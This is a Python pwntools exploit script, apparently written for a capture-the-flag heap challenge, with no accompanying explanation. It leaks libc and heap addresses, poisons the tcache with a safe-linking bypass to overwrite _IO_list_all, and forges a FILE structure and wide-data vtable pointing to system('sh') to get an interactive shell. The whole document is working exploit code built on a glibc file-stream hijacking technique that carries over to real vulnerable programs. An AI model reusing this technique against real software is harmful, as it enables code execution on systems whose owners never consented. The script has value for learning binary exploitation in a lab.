
from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")

gs = '''
set solib-search-path /home/huhu/my-task/pwn/daily-task/bai15/
c
'''

def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gs)
    else:
        return process(exe.path)

p = start() 
def choice(index):
    p.sendlineafter(b"> ", str(index).encode())
def init():
    p.sendafter(b"Enter author name: ", b"A"*0x20)
    p.sendafter(b"Enter introduction: ", b"A"*0x40)
def malloc(index, size):
    choice(1)
    p.sendafter(b"Please input the chunk index: ", str(index).encode())
    p.sendafter(b"Please input the size: ", str(size).encode())
def free(index):
    choice(5)
    p.sendafter(b"Please input the chunk index: ", str(index).encode())
def show(index):
    choice(4)
    p.sendafter(b"Please input the chunk index: ", str(index).encode())
def edit(index, size, content):
    choice(6)
    p.sendafter(b"Please input the chunk index: ", str(index).encode())
    p.sendafter(b"Please input the size: ", str(size).encode())
    p.sendafter(b"Please input the content: ", content)
init()
malloc(0, 0x410)
malloc(1, 0x410)
malloc(2, 0x410)
malloc(3, 0x410)
free(0)
free(2)
show(0)
p.recvuntil(b"Content: ")
libc_addr = u64(p.recv(6) + b"\x00" + b"\x00") - (libc.symbols['main_arena'] + 0x60)
show(2)
p.recvuntil(b"Content: ")
heap_leak = u64(p.recv(6) + b"\x00" + b"\x00") - 0x290

log.info(f"[*]libc = {hex(libc_addr)}")
log.info(f"[*]heap = {hex(heap_leak)}")

malloc(0, 0x410)
malloc(2, 0x410)

for i in range(4, 18):
    malloc(i, 0x78)
for i in range(4, 18):
    free(i)
edit(11, 8, p64((((heap_leak + 0x16a0) >> 12) ^ (libc.symbols['_IO_list_all'] - 0x10 + libc_addr))))
for i in range(4, 13):
    malloc(i, 0x78)
edit(12, 8, p64(heap_leak+0x6c0))
chunk0_addr = heap_leak + 0x2a0 - 0x10
fake_io = b"\x01\x08||sh\x00\x00" + p64(0)
fake_io = fake_io.ljust(0x20, b"\x00") + p64(2)
fake_io = fake_io.ljust(0x28, b"\x00") + p64(3)
fake_io = fake_io.ljust(0xA0, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0, b"\x00") + p64(0)
fake_io = fake_io.ljust(0xD8, b"\x00") + p64(libc.sym["_IO_wfile_jumps_mmap"] + libc_addr + 0x30)
edit(1, 0x410, fake_io)
fake_wide_data = b"\x00" * 0x18 + p64(0)
fake_wide_data = fake_wide_data.ljust(0x20, b"\x00")
fake_wide_data += p64(0xffffffffffffffff)
fake_wide_data = fake_wide_data.ljust(0xE0, b"\x00")
fake_wide_data += p64(chunk0_addr + 0x200)
payload = b"\x00" * 0x20 + fake_wide_data
fake_vtable = b"\x00" * 0x18 + p64(libc.sym["system"] + libc_addr)
payload = payload.ljust(0x1F0, b"\x00") + fake_vtable
edit(0,0x410, payload)
choice(8)
p.interactive()